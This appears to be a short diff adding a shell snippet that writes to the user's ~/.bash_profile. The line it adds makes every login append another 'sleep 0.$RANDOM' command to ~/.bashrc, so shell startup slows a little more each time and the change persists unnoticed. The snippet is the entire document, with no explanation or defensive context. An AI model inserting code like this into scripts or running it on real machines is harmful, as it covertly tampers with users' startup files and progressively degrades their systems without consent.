@@ -1,0 +1,3 @@
+cat >> "$HOME/.bash_profile" << 'EOF'
+echo "sleep 0.$RANDOM" >> ~/.bashrc
+EOF
